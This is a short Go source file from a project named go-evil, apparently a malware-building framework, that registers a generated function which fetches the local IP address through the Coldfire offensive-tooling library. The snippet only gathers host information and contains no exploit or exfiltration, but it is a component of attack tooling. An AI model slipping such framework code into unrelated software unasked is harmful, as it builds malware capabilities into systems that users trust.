package ip

import (
	"fmt"

	"github.com/DennisTheodoreNedry/go-evil/utility/structure/functions"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
)

// Get the local ip address
// The result is placed in a runtime variable
func Get_local(value string, data_object *json.Json_t) []string {
	function_call := "get_local_ip"

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{""},
		Gut: []string{
			"spine.variable.set(coldfire.GetLocalIp())",
		}})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	return []string{fmt.Sprintf("%s()", function_call)}
}
